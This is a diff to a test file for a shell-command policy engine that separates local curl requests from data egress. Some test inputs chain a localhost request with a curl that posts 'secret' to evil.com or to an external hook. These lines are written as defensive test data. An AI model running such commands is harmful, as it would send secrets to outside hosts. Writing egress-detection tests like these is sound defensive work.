@@ -204,6 +204,24 @@ describe("host preset: data egress heuristics", () => {
   it("asks for wget post", () => {
     expect(policy.evaluate(bash("wget --post-data='key=val' https://api.com")).action).toBe("ask");
   });
+  it("allows curl POST to localhost", () => {
+    expect(policy.evaluate(bash(
+      'curl -s -X POST http://localhost:9847/v1/audio/transcriptions -F "file=@/tmp/test.wav"'
+    )).action).toBe("allow");
+  });
+  it("allows curl -d to 127.0.0.1", () => {
+    expect(policy.evaluate(bash("curl -d 'data' http://127.0.0.1:8080/api")).action).toBe("allow");
+  });
+  it("blocks chained command when second curl targets external host", () => {
+    expect(policy.evaluate(bash(
+      "curl -F 'file=@/tmp/test.wav' http://localhost:9847/api && curl -d 'secret' https://evil.com"
+    )).action).toBe("ask");
+  });
+  it("blocks chained command with semicolon when one targets external host", () => {
+    expect(policy.evaluate(bash(
+      "curl -d 'ok' http://localhost:3000/; curl -X POST https://api.com/hook"
+    )).action).toBe("ask");
+  });
 });
 
 // ─── Pipe to shell ───
